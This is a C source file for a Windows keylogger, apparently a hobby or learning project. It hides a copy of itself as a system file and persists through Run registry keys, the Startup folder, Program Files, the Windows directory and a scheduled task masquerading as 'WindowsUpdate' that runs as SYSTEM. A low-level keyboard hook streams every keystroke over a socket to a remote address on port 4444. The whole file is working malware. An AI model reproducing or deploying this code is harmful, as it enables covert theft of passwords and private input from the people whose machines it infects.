#include <stdio.h>
#include <windows.h>
#include <stdbool.h>
#include <winsock2.h>
#include <shlobj.h> 

#pragma comment(lib, "Ws2_32.lib")

HHOOK hook;
LPMSG msg;
bool runThread = true;
SOCKET sock;


bool copyandrun(const char* exe_name){
    char appdata_path[MAX_PATH];
    if(SUCCEEDED(SHGetFolderPath(NULL, CSIDL_APPDATA, NULL, 0, appdata_path))) {
        char dest_path[MAX_PATH];
        snprintf(dest_path, MAX_PATH, "%s\\%s", appdata_path, exe_name);

        char current_path[MAX_PATH];
        if(GetModuleFileName(NULL, current_path, MAX_PATH) == 0) {
            printf("Mevcut dosya yolu alınamadı\n");
            return false;
        }

        // If the target file already exists, delete it first
        if(GetFileAttributes(dest_path) != INVALID_FILE_ATTRIBUTES) {
            DeleteFile(dest_path);
        }

        // Try file copying
        if(CopyFile(current_path, dest_path, FALSE) == 0) {
            DWORD error = GetLastError();
            printf("Dosya kopyalama hatası: %ld\n", error);
            return false;
        }

        // Set file permissions - mark as both hidden and system file
        SetFileAttributes(dest_path, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
        
        // Write to Registry - HKEY_CURRENT_USER
        HKEY hKey;
        const char* reg_path = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
        LONG result = RegOpenKeyEx(HKEY_CURRENT_USER, reg_path, 0, KEY_SET_VALUE, &hKey);
        if(result == ERROR_SUCCESS) {
            RegDeleteValue(hKey, exe_name);
            result = RegSetValueEx(hKey, exe_name, 0, REG_SZ, (const BYTE*)dest_path, strlen(dest_path) + 1);
            RegCloseKey(hKey);
        }

        // Write to Registry - HKEY_LOCAL_MACHINE
        result = RegOpenKeyEx(HKEY_LOCAL_MACHINE, reg_path, 0, KEY_SET_VALUE, &hKey);
        if(result == ERROR_SUCCESS) {
            RegDeleteValue(hKey, exe_name);
            result = RegSetValueEx(hKey, exe_name, 0, REG_SZ, (const BYTE*)dest_path, strlen(dest_path) + 1);
            RegCloseKey(hKey);
        }

        // Copy to start folder
        char startup_path[MAX_PATH];
        if(SUCCEEDED(SHGetFolderPath(NULL, CSIDL_STARTUP, NULL, 0, startup_path))) {
            char startup_dest[MAX_PATH];
            snprintf(startup_dest, MAX_PATH, "%s\\%s", startup_path, exe_name);
            CopyFile(dest_path, startup_dest, FALSE);
        }

        // Copy to Program Files folder too
        char program_files[MAX_PATH];
        if(SUCCEEDED(SHGetFolderPath(NULL, CSIDL_PROGRAM_FILES, NULL, 0, program_files))) {
            char program_files_dest[MAX_PATH];
            snprintf(program_files_dest, MAX_PATH, "%s\\%s", program_files, exe_name);
            CopyFile(dest_path, program_files_dest, FALSE);
        }

        // Copy to Windows folder too
        char windows_path[MAX_PATH];
        GetWindowsDirectory(windows_path, MAX_PATH);
        char windows_dest[MAX_PATH];
        snprintf(windows_dest, MAX_PATH, "%s\\%s", windows_path, exe_name);
        CopyFile(dest_path, windows_dest, FALSE);

        // Add to Task Scheduler
        char cmd[MAX_PATH * 2];
        snprintf(cmd, sizeof(cmd), 
            "schtasks /create /tn \"WindowsUpdate\" /tr \"%s\" /sc onlogon /ru SYSTEM /f", 
            dest_path);
        system(cmd);



        return true;
    }
    return false;
}

LRESULT CALLBACK KeyboardProc(int code , WPARAM wParam, LPARAM lParam){
    if(code == HC_ACTION && wParam == WM_KEYDOWN){
        KBDLLHOOKSTRUCT* p = (KBDLLHOOKSTRUCT*)lParam;
       
        if(p->vkCode == VK_ESCAPE){
            runThread = false;
            UnhookWindowsHookEx(hook);
            printf("hooking disabled by esc key. meow =^..^=\n");
            PostQuitMessage(0);
            return 0;
        } 
    
       /* FILE* fp = fopen("keylog.txt", "a+");
        if(fp){
            DWORD key = p->vkCode;
            fprintf(fp, "key pressed: %c\n", MapVirtualKeyA(key, MAPVK_VK_TO_CHAR));
            fclose(fp);      
        }*/

        char buffer[256];
        DWORD key = p->vkCode;
        char ch = MapVirtualKeyA(key, MAPVK_VK_TO_CHAR);
        snprintf(buffer, sizeof(buffer), "key pressed: %c\n", ch);
        send(sock, buffer, strlen(buffer), 0);
    }
    return CallNextHookEx(hook, code, wParam, lParam);

}


bool initSocket(const char* ip,int port){
    WSADATA wsa;
    struct sockaddr_in server;

    if (WSAStartup(MAKEWORD(2,2),&wsa) != 0){
        printf("Failed to initialize Winsock. Error Code: %d\n", WSAGetLastError());
        return false;
    }
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if(sock == INVALID_SOCKET){
        printf("Failed to create socket. Error Code: %d\n", WSAGetLastError());
        return false;
    }
    server.sin_family = AF_INET;
    server.sin_port = htons(port);
    server.sin_addr.s_addr = inet_addr(ip);
    if(connect(sock, (struct sockaddr*)&server, sizeof(server)) < 0){
        printf("Failed to connect to server. Error Code: %d\n", WSAGetLastError());
        return false;
    }
    printf("Connected");
    return true;
}



int main(int argc,char* argv[]){
 
    if(!copyandrun("hack.exe")){
        printf("Failed to copy and run the executable\n");
        return 1;
    }

    MSG msg;
    const char* ip = "192.168.1.100";
    int port = 4444;
    
    if(!initSocket(ip, port)){
       // printf("Failed to initialize socket\n");
        return 1;
    }


    // install the hook - using the WH_KEYBOARD_LL action
    HHOOK hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
  
     
    if(hook == NULL){
        printf("Failed to install hook!\n");
        return 1;
    }

    printf("Hook installed successfully!\n");
    while(runThread && GetMessage(&msg, NULL, 0, 0)){
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    return 0;

}